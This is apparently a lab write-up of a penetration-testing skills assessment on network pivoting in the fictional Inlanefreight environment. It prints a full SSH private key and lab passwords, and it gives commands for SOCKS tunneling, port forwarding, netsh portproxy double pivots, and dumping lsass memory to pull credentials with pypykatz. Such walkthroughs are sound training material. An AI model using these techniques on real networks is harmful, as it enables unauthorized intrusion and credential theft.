

## Skill Assesstment Pivoting


**Scenario**

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

---

 **Objectives**

- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.

**Note:**

Keep in mind the tools and tactics you practiced throughout this module. Each one can provide a different route into the next pivot point. You may find a hop to be straightforward from one set of hosts, but that same tactic may not work to get you to the next. While completing this skills assessment, we encourage you to take proper notes, draw out a map of what you know of already, and plan out your next hop. Trying to do it on the fly will prove `difficult` without having a visual to reference.

---

## Connection Info

`Foothold`:

`IP`:

You will find the web shell pictured below when you browse to support.inlanefreight.local or the target IP above.

![Browser window displaying a terminal session at p0wny@shell with the address 10.129.201.127, showing a command prompt in the /www/html directory.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/webshell.png)

  

Note: When spawning your target, we ask you to wait for 3 - 5 minutes until the whole lab with all the configurations is set up so that the connection to your target works flawlessly.


---

We found the `id_rsa` private key and the `webadmin` user through the web shell:

```
ww-data@inlanefreight.local:/home/webadmin# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Since the file had open permissions (`0666`), SSH rejected it. We restricted access to owner-only read/write and connected successfully:

```bash
chmod 600 id_rsa
ssh -i id_rsa webadmin@10.129.229.129
```

We found a note in the `webadmin` home directory containing credentials to reach internal servers in the subnet:

```
webadmin@inlanefreight:~$ cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

We enumerated active hosts in the `172.16.5.0/24` subnet using a ping sweep, finding two live hosts:

```
webadmin@inlanefreight:~$ for i in $(seq 1 254); do ping -c1 -W1 172.16.5.$i &>/dev/null && echo "[+] Active host -> 172.16.5.$i" & done 2>/dev/null; wait 2>/dev/null
[+] Active host -> 172.16.5.15
[+] Active host -> 172.16.5.35
```


We established a dynamic SSH tunnel to route traffic through the compromised host into the internal subnet:

```bash
ssh -i id_rsa -D 1080 webadmin@10.129.229.129
```

Then we configured `/etc/proxychains.conf` to use the tunnel:
``` 
socks5 127.0.0.1 1080
```

Using proxychains, we scanned the open ports on `172.16.5.35`, discovering five open ports. The detected OS was **Windows Server**:

```
proxychains scapot -t 172.16.5.35 -m top -b

═══════════════════════════════════════════════════
 Scan completed | 5 open port(s)
═══════════════════════════════════════════════════
  ► 22     │ SSH
  ► 135    │ MSRPC           │ Microsoft RPC
  ► 139    │ NetBIOS-SSN
  ► 445    │ SMB
  ► 3389   │ RDP             │ Microsoft Terminal Services (RDP)
═══════════════════════════════════════════════════
 OS detected  │ Windows Server
═══════════════════════════════════════════════════
```

The presence of ports `445` (SMB) and `3389` (RDP) are particularly interesting for lateral movement using the credentials found earlier (`mlefay / Plain Human work!`).

We ran Nmap NSE scripts for deeper enumeration on `172.16.5.35`, obtaining detailed service and domain information:

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.9 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: PIVOT-SRV01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
```

Key findings:

- **Hostname:** `PIVOT-SRV01.INLANEFREIGHT.LOCAL`
- **Domain:** `INLANEFREIGHT.LOCAL`
- **OS:** Windows Server 2019 (build 17763)
- **SMB signing:** enabled but not required


We added the hostname and domain of `PIVOT-SRV01` to our `/etc/hosts` file for easier resolution

```bash
echo "172.16.5.35  PIVOT-SRV01.INLANEFREIGHT.LOCAL PIVOT-SRV01" | sudo tee -a /etc/hosts
```

Using the credentials found earlier, we connected to `PIVOT-SRV01` via RDP through the proxychains tunnel:

```bash
proxychains xfreerdp3 /u:mlefay /p:'Plain Human work!' /v:172.16.5.35
```

Successfully gaining interactive access to the internal Windows Server host `PIVOT-SRV01.INLANEFREIGHT.LOCAL`.


Once inside `PIVOT-SRV01`, we ran `ipconfig` and discovered the host has **two network interfaces**, revealing a third subnet `172.16.6.0/24`:

```
Ethernet adapter Ethernet0:
   IPv4 Address. . . : 172.16.5.35
   Subnet Mask . . . : 255.255.0.0
   Default Gateway . : 172.16.5.1

Ethernet adapter Ethernet1 2:
   IPv4 Address. . . : 172.16.6.35
   Subnet Mask . . . : 255.255.0.0
   Default Gateway . :
```

`PIVOT-SRV01` acts as a dual-homed host, connected to both `172.16.5.0/24` and `172.16.6.0/24`, opening the path for deeper pivoting.

We performed a ping sweep across the `172.16.6.0/24` subnet from `PIVOT-SRV01`, discovering three active hosts:

```
C:\Windows\system32> for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.6.%i | find "TTL=" && echo [+] 172.16.6.%i
Reply from 172.16.6.25: bytes=32 time=1ms TTL=128
[+] 172.16.6.25
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128
[+] 172.16.6.35
Reply from 172.16.6.45: bytes=32 time<1ms TTL=64
[+] 172.16.6.45
```

- `172.16.6.35` — `PIVOT-SRV01` itself
- `172.16.6.25` — external host (Windows, TTL=128)
- `172.16.6.45` — external host (likely Linux, TTL=64)


Checking Task Manager, we found the `lsass.exe` process and were able to create a memory dump to extract credentials offline:

1. Opened **Task Manager** (`Ctrl+Shift+Esc`)
2. Navigated to the **Details** tab
3. Located `lsass.exe` → right click → **Create dump file**

The dump file was saved to analyze offline with **pypykatz** or **Mimikatz**.

<img src="/budahacksecurity/uploads/md_images/spivo/pvt.png" style="max-width:100%; border-radius:8px;">


We reconnected to `PIVOT-SRV01` via RDP mounting a local drive to transfer the `lsass.DMP` file:

```bash
proxychains xfreerdp3 /u:mlefay /p:'Plain Human work!' /v:172.16.5.35 /drive:share,/tmp
```

Then from Windows, we copied the dump file to the mounted drive:

```cmd
copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\share\
```

The file was saved to `/tmp` on our Kali machine for offline analysis.


We analyzed the `lsass.DMP` file offline using **pypykatz** and saved the output for review:

```bash
pypykatz lsa minidump lsass.DMP >> lsa.txt
```

Using pypykatz, we extracted credentials from the `lsass.DMP` file, finding a Kerberos plaintext password for user `vfrank`:

```bash
cat lsa.txt | grep "vfrank\|Password\|Kerberos"

Username: vfrank
Password: Imply wet Unmasked!
```

We performed double pivoting by first creating an SSH port forward from our Kali machine through `webadmin` to redirect traffic toward `172.16.6.25`:


```bash
ssh -L 0.0.0.0:3389:172.16.6.25:3389 webadmin@10.129.229.129 -i id_rsa -N
```

Then on `PIVOT-SRV01` we configured a `netsh portproxy` rule to forward traffic from port `3390` to `172.16.6.25:3389`:


```cmd
netsh interface portproxy add v4tov4 listenport=3390 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.25
```

<img src="/budahacksecurity/uploads/md_images/spivo/pvt3.png" style="max-width:100%; border-radius:8px;">


Finally we connected via proxychains through the full chain:

```bash
proxychains xfreerdp3 /u:vfrank /p:'Imply wet Unmasked!' /v:172.16.5.35:3390
```


<img src="/budahacksecurity/uploads/md_images/spivo/pvt2.png" style="max-width:100%; border-radius:8px;">
